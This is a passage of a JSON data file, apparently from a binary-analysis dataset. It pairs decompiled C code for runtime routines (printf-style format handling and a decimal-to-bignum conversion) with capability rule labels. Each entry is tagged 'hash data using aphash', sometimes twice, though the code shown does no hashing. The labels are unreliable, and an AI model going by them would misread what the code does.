var_ch = 0x20;\n                    arg_ch = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x004a1ac5;\n            }\n            uVar7 = 0x2b;\n        }\n        else {\n            uVar7 = 0x2d;\n        }\n        var_ch = uVar7;\n        var_10h = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a1ac5:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar6 = 0x78,  iVar1 == 0x41)) {\n            uVar6 = 0x58;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = uVar6;\n        arg_ch = arg_ch + 2;\n        var_10h = arg_ch;\n    }\n    arg_8h = param_1 + 0x448;\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((*(param_1 + 0x20) & 0xc) == 0) {\n        fcn.00405bd2(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n        arg_ch = var_10h;\n    }\n    fcn.004040ed(&var_ch, arg_ch, param_1 + 0x18, param_1 + 0xc);\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.00405bd2(arg_8h, 0x30, arg_10h, param_1 + 0x18);\n    }\n    fcn.00403003(0);\n    if ((-1 < *(param_1 + 0x18)) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.00405bd2(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n    }\ncode_r0x004a1bba:\n    fcn.004030bc(unaff_ESI);\n    return;\n}\n",
        "token_count": 1750
    },
    "00406447": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031",
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00406447(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar4 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x004a0bd5:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\ncode_r0x004a0bd9:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x004a0bdc:\n            cVar4 = fcn.00405939(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x004a0b81:\n                arg_8h = 0x10;\n                goto code_r0x004a0bdc;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x004a0b95;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x004a0b69;\n                }\n            }\ncode_r0x004a0be5:\n            cVar4 = fcn.00403ba2();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00404f52();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x004a0be5;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x004a0b95:\n            cVar4 = fcn.00404183(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.004044c1();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x004a0be5;\n            if (cVar4 == 'i') goto code_r0x004a0bd5;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.00402ce3();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.0040159b();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x004a0b81;\n            }\n            goto code_r0x004a0bd9;\n        }\ncode_r0x004a0b69:\n        cVar4 = fcn.0040367f();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    var_4h = var_4h._3_1_ << 0x18;\n    uVar1 = *(in_ECX + 0x20);\n    var_8h = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = CONCAT31(var_4h._1_3_, 0x20);\n                    arg_ch = 1;\n                    var_8h = 1;\n                }\n                goto code_r0x004a0c6b;\n            }\n            var_4h = CONCAT31(var_4h._1_3_, 0x2b);\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n        var_8h = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a0c6b:\n    cVar4 = *(in_ECX + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar1 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&var_4h + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&var_4h + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        var_8h = arg_ch;\n    }\n    arg_14h = in_ECX + 0x18;\n    arg_10h = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - arg_ch;\n    if ((*(in_ECX + 0x20) & 0xc) == 0) {\n        fcn.00404039(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n        arg_ch = var_8h;\n    }\n    fcn.0040549d(&var_4h, arg_ch, arg_14h);\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.00404039(in_ECX + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.0040553d(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.00404039(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1693
    },
    "004035a3": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031",
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004035a3(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    uVar7 = *(param_1 + 0x32);\n    if (uVar7 < 0x65) {\n        if (uVar7 == 100) {\ncode_r0x004a1d1e:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x004a1d22:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x004a1d25:\n            cVar5 = fcn.00402356(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar7 < 0x59) {\n            if (uVar7 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x004a1cca:\n                arg_8h_00 = 0x10;\n                goto code_r0x004a1d25;\n            }\n            if (uVar7 != 0x41) {\n                if (uVar7 == 0x43) goto code_r0x004a1cde;\n                if (uVar7 < 0x45) goto code_r0x004a1eae;\n                if (0x47 < uVar7) {\n                    if (uVar7 != 0x53) goto code_r0x004a1eae;\n                    goto code_r0x004a1cb2;\n                }\n            }\ncode_r0x004a1d2e:\n            cVar5 = fcn.0040509c();\n        }\n        else if (uVar7 == 0x5a) {\n            cVar5 = fcn.004069fb();\n        }\n        else {\n            if (uVar7 == 0x61) goto code_r0x004a1d2e;\n            if (uVar7 != 99) goto code_r0x004a1eae;\ncode_r0x004a1cde:\n            cVar5 = fcn.004040b1(0);\n        }\n    }\n    else if (uVar7 < 0x71) {\n        if (uVar7 == 0x70) {\n            cVar5 = fcn.00401b95();\n        }\n        else {\n            if (uVar7 < 0x68) goto code_r0x004a1d2e;\n            if (uVar7 == 0x69) goto code_r0x004a1d1e;\n            if (uVar7 == 0x6e) {\n                cVar5 = fcn.004044ee();\n            }\n            else {\n                if (uVar7 != 0x6f) goto code_r0x004a1eae;\n                cVar5 = fcn.00402248();\n            }\n        }\n    }\n    else {\n        if (uVar7 != 0x73) {\n            if (uVar7 != 0x75) {\n                if (uVar7 != 0x78) goto code_r0x004a1eae;\n                arg_ch_00 = 0;\n                goto code_r0x004a1cca;\n            }\n            goto code_r0x004a1d22;\n        }\ncode_r0x004a1cb2:\n        cVar5 = fcn.00402293();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0x30) != '\\0')) goto code_r0x004a1eae;\n    arg_ch = 0;\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    uVar2 = *(param_1 + 0x20);\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x004a1db9;\n            }\n            uVar7 = 0x2b;\n        }\n        else {\n            uVar7 = 0x2d;\n        }\n        var_ch = uVar7;\n        var_10h = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a1db9:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar6 = 0x78,  iVar1 == 0x41)) {\n            uVar6 = 0x58;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = uVar6;\n        arg_ch = arg_ch + 2;\n        var_10h = arg_ch;\n    }\n    arg_8h = param_1 + 0x448;\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((*(param_1 + 0x20) & 0xc) == 0) {\n        fcn.00403fbc(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n        arg_ch = var_10h;\n    }\n    fcn.00402978(&var_ch, arg_ch, param_1 + 0x18);\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403fbc(arg_8h, 0x30, arg_10h, param_1 + 0x18);\n    }\n    fcn.0040133e(0);\n    if ((-1 < *(param_1 + 0x18)) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403fbc(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n    }\ncode_r0x004a1eae:\n    fcn.004030bc(unaff_ESI);\n    return;\n}\n",
        "token_count": 1742
    },
    "004035d5": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031",
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004035d5(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar4 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x004a0646:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\ncode_r0x004a064a:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x004a064d:\n            cVar4 = fcn.004037d8(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x004a05f2:\n                arg_8h = 0x10;\n                goto code_r0x004a064d;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x004a0606;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x004a05da;\n                }\n            }\ncode_r0x004a0656:\n            cVar4 = fcn.004014ba();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00405f65();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x004a0656;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x004a0606:\n            cVar4 = fcn.004052cc(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.004061f9();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x004a0656;\n            if (cVar4 == 'i') goto code_r0x004a0646;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.0040661d();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.00403eb3();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x004a05f2;\n            }\n            goto code_r0x004a064a;\n        }\ncode_r0x004a05da:\n        cVar4 = fcn.00402117();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.004030cb();\n    if (cVar4 != '\\0') {\n        return 1;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    var_4h = var_4h._3_1_ << 0x18;\n    uVar1 = *(in_ECX + 0x20);\n    var_8h = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = CONCAT31(var_4h._1_3_, 0x20);\n                    arg_ch = 1;\n                    var_8h = 1;\n                }\n                goto code_r0x004a06eb;\n            }\n            var_4h = CONCAT31(var_4h._1_3_, 0x2b);\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n        var_8h = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a06eb:\n    cVar4 = *(in_ECX + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar1 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&var_4h + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&var_4h + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        var_8h = arg_ch;\n    }\n    arg_14h = in_ECX + 0x18;\n    arg_10h = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - arg_ch;\n    if ((*(in_ECX + 0x20) & 0xc) == 0) {\n        fcn.00403d6e(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n        arg_ch = var_8h;\n    }\n    fcn.00405ef2(&var_4h, arg_ch, arg_14h, in_ECX + 0xc);\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403d6e(in_ECX + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.004041a6(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403d6e(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1720
    },
    "00405033": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031",
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00405033(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    uVar7 = *(param_1 + 0x32);\n    if (uVar7 < 0x65) {\n        if (uVar7 == 100) {\ncode_r0x004a2012:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x004a2016:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x004a2019:\n            cVar5 = fcn.004043ae(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar7 < 0x59) {\n            if (uVar7 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x004a1fbe:\n                arg_8h_00 = 0x10;\n                goto code_r0x004a2019;\n            }\n            if (uVar7 != 0x41) {\n                if (uVar7 == 0x43) goto code_r0x004a1fd2;\n                if (uVar7 < 0x45) goto code_r0x004a21b1;\n                if (0x47 < uVar7) {\n                    if (uVar7 != 0x53) goto code_r0x004a21b1;\n                    goto code_r0x004a1fa6;\n                }\n            }\ncode_r0x004a2022:\n            cVar5 = fcn.004040ac();\n        }\n        else if (uVar7 == 0x5a) {\n            cVar5 = fcn.00404ab6();\n        }\n        else {\n            if (uVar7 == 0x61) goto code_r0x004a2022;\n            if (uVar7 != 99) goto code_r0x004a21b1;\ncode_r0x004a1fd2:\n            cVar5 = fcn.00402720(0);\n        }\n    }\n    else if (uVar7 < 0x71) {\n        if (uVar7 == 0x70) {\n            cVar5 = fcn.00401429();\n        }\n        else {\n            if (uVar7 < 0x68) goto code_r0x004a2022;\n            if (uVar7 == 0x69) goto code_r0x004a2012;\n            if (uVar7 == 0x6e) {\n                cVar5 = fcn.004024d2();\n            }\n            else {\n                if (uVar7 != 0x6f) goto code_r0x004a21b1;\n                cVar5 = fcn.00402662();\n            }\n        }\n    }\n    else {\n        if (uVar7 != 0x73) {\n            if (uVar7 != 0x75) {\n                if (uVar7 != 0x78) goto code_r0x004a21b1;\n                arg_ch_00 = 0;\n                goto code_r0x004a1fbe;\n            }\n            goto code_r0x004a2016;\n        }\ncode_r0x004a1fa6:\n        cVar5 = fcn.00403c83();\n    }\n    if (((cVar5 == '\\0') || (cVar5 = fcn.0040263a(),  cVar5 != '\\0')) || (*(param_1 + 0x30) != '\\0'))\n    goto code_r0x004a21b1;\n    arg_ch = 0;\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    uVar2 = *(param_1 + 0x20);\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x004a20bc;\n            }\n            uVar7 = 0x2b;\n        }\n        else {\n            uVar7 = 0x2d;\n        }\n        var_ch = uVar7;\n        var_10h = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a20bc:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar6 = 0x78,  iVar1 == 0x41)) {\n            uVar6 = 0x58;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = uVar6;\n        arg_ch = arg_ch + 2;\n        var_10h = arg_ch;\n    }\n    arg_8h = param_1 + 0x448;\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((*(param_1 + 0x20) & 0xc) == 0) {\n        fcn.00403fbc(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n        arg_ch = var_10h;\n    }\n    fcn.00402978(&var_ch, arg_ch, param_1 + 0x18);\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403fbc(arg_8h, 0x30, arg_10h, param_1 + 0x18);\n    }\n    fcn.00405df8(0);\n    if ((-1 < *(param_1 + 0x18)) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403fbc(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n    }\ncode_r0x004a21b1:\n    fcn.004030bc(unaff_ESI);\n    return;\n}\n",
        "token_count": 1748
    },
    "00403a76": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_b2ch\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403a76(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint32_t *puVar8;\n    uint32_t *puVar9;\n    uint32_t uVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t uVar13;\n    uint32_t *puVar14;\n    uint *puVar15;\n    bool bVar16;\n    uint64_t uVar17;\n    int64_t iVar18;\n    int32_t iVar19;\n    uint32_t *var_b2ch;\n    uint var_b28h;\n    uint32_t *var_95ch;\n    uint32_t *var_958h;\n    uint32_t *var_954h;\n    int32_t var_950h;\n    uint32_t *var_94ch;\n    uint32_t *var_948h;\n    uint32_t var_944h;\n    uint32_t *var_940h;\n    uint32_t *var_93ch;\n    uint32_t *var_938h;\n    uint32_t *var_934h;\n    uint32_t *var_930h;\n    uint32_t *var_92ch;\n    uint32_t *var_928h;\n    uint32_t *var_924h;\n    uint32_t *var_920h;\n    uint32_t *var_91ch;\n    uint32_t *var_918h;\n    uint32_t *var_914h;\n    uint32_t var_910h;\n    uint32_t *var_744h;\n    uint32_t var_740h;\n    uint var_73ch;\n    uint32_t *var_574h;\n    uint var_570h;\n    uint32_t *var_3a4h;\n    uint32_t var_3a0h;\n    uint32_t *var_1d4h;\n    uint32_t var_1d0h;\n    uint var_1cch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    uVar10 = *arg_8h;\n    var_948h = arg_8h;\n    var_950h = arg_ch;\n    var_94ch = ((*(arg_ch + 4) == '\\0') - 1 & 0x1d) + 0x19;\n    if (uVar10 < 0) {\n        uVar10 = 0;\n    }\n    uVar13 = arg_8h[1];\n    uVar3 = uVar10;\n    if (uVar13 <= uVar10) {\n        uVar3 = uVar13;\n    }\n    var_938h = uVar10 - uVar3;\n    puVar14 = arg_8h + 2;\n    var_954h = uVar3 + 8 + arg_8h;\n    var_958h = uVar13 + 8 + arg_8h;\n    puVar11 = NULL;\n    var_91ch = var_958h - var_954h;\n    var_918h = NULL;\n    uVar10 = 0;\n    var_1d4h = NULL;\n    var_920h = NULL;\n    var_93ch = puVar14;\n    if (puVar14 != var_954h) {\n        do {\n            if (uVar10 == 9) {\n                var_93ch = puVar14;\n                if (puVar11 != NULL) {\n                    uVar10 = 0;\n                    puVar12 = NULL;\n                    do {\n                        uVar13 = (&var_1d0h)[puVar12];\n                        uVar3 = uVar13 * 1000000000;\n                        (&var_1d0h)[puVar12] = uVar3 + uVar10;\n                        uVar10 = (uVar13 * 1000000000 >> 0x20) + CARRY4(uVar3, uVar10);\n                        puVar12 = puVar12 + 1;\n                    } while (puVar12 != puVar11);\n                    puVar11 = var_1d4h;\n                    if (uVar10 != 0) {\n                        if (var_1d4h < 0x73) {\n                            (&var_1d0h)[var_1d4h] = uVar10;\n                            var_1d4h = var_1d4h + 1;\n                            puVar11 = var_1d4h;\n                        }\n                        else {\n                            var_914h = NULL;\n                            var_1d4h = NULL;\n                            fcn.004bc06c(&var_1d0h, 0x1cc, &var_910h, 0);\n                            puVar11 = var_1d4h;\n                        }\n                    }\n                }\n                if (var_920h != NULL) {\n                    puVar8 = NULL;\n                    puVar12 = var_920h;\n                    if (puVar11 != NULL) {\n                        do {\n                            ppuVar1 = &var_1d0h + puVar8;\n                            puVar7 = *ppuVar1;\n                            *ppuVar1 = *ppuVar1 + puVar12;\n                            puVar12 = CARRY4(puVar7, puVar12);\n                            puVar8 = puVar8 + 1;\n                            puVar11 = var_1d4h;\n                        } while (puVar8 != var_1d4h);\n                    }\n                    if (puVar12 != NULL) {\n                        if (puVar11 < 0x73) {\n                            (&var_1d0h)[puVar11] = puVar12;\n                            var_1d4h = var_1d4h + 1;\n                            puVar11 = var_1d4h;\n                        }\n                        else {\n                            var_914h = NULL;\n                            var_1d4h = NULL;\n                            fcn.004bc06c(&var_1d0h, 0x1cc, &var_910h, 0);\n                            puVar11 = var_1d4h;\n                        }\n                    }\n                }\n                var_920h = NULL;\n                uVar10 = 0;\n            }\n            var_920h = var_920h * 10 + *puVar14;\n            uVar10 = uVar10 + 1;\n            puVar14 = puVar14 + 1;\n        } while (puVar14 != var_954h);\n        var_93ch = puVar14;\n        var_918h = puVar11;\n        if (uVar10 != 0) {\n            var_92ch = uVar10 % 10;\n            for (var_934h = uVar10 / 10; var_918h = puVar11,  var_934h != NULL; var_934h = var_934h - var_928h) {\n                var_928h = var_934h;\n                if (0x26 < var_934h) {\n                    var_928h = 0x26;\n                }\n                uVar10 = *(var_928h * 4 + 0x5583e6);\n                uVar13 = *(var_928h * 4 + 0x5583e7);\n                var_914h = uVar10 + uVar13;\n                fcn.00403189(&var_910h, 0, uVar10 * 4);\n                fcn.00405830(&var_910h + uVar10, *(var_928h * 4 + 0x5583e4) * 4 + 0x557910, uVar13 << 2);\n                uVar10 = var_1d0h;\n                if (var_914h < 0x2) {\n                    if (var_910h == 0) {\n                        var_574h = NULL;\n                        puVar15 = &var_570h;\ncode_r0x004b8127:\n                        var_1d4h = NULL;\n                        fcn.004bc06c(&var_1d0h, 0x1cc, puVar15, 0);\n                    }\n                    else {\n                        if ((var_910h == 1) || (puVar11 == NULL)) {\n                            bVar16 = true;\n                            goto code_r0x004b8403;\n                        }\n                        uVar10 = 0;\n                        puVar14 = NULL;\n                        do {\n                            uVar13 = (&var_1d0h)[puVar14];\n                            uVar3 = var_910h * uVar13;\n                            (&var_1d0h)[puVar14] = uVar3 + uVar10;\n                            uVar10 = (var_910h * uVar13 >> 0x20) + CARRY4(uVar3, uVar10);\n                            puVar14 = puVar14 + 1;\n                        } while (puVar14 != puVar11);\n                        if (uVar10 != 0) {\n                            if (0x72 < var_1d4h) {\ncode_r0x004b81a0:\n                                var_914h = NULL;\n                                var_1d4h = NULL;\n                                fcn.004bc06c(&var_1d0h, 0x1cc, &var_910h, 0);\n                                bVar16 = false;\n                                var_918h = var_1d4h;\n                                goto code_r0x004b8403;\n                            }\n                            (&var_1d0h)[var_1d4h] = uVar10;\ncode_r0x004b8191:\n                            var_1d4h = var_1d4h + 1;\n                        }\n                    }\ncode_r0x004b813c:\n                    bVar16 = true;\n                    var_918h = var_1d4h;\n                }\n                else if (puVar11 < 0x2) {\n                    var_1d4h = var_914h;\n                    fcn.004bc06c(&var_1d0h, 0x1cc, &var_910h, var_914h << 2);\n                    if (uVar10 == 0) {\n                        var_914h = NULL;\n                        puVar15 = &var_910h;\n                        goto code_r0x004b8127;\n                    }\n                    bVar16 = true;\n                    var_918h = var_1d4h;\n                    if ((uVar10 != 1) && (var_1d4h != NULL)) {\n                        uVar13 = 0;\n                        puVar14 = NULL;\n                        do {\n                            uVar3 = (&var_1d0h)[puVar14];\n                            uVar4 = uVar10 * uVar3;\n                            (&var_1d0h)[puVar14] = uVar4 + uVar13;\n                            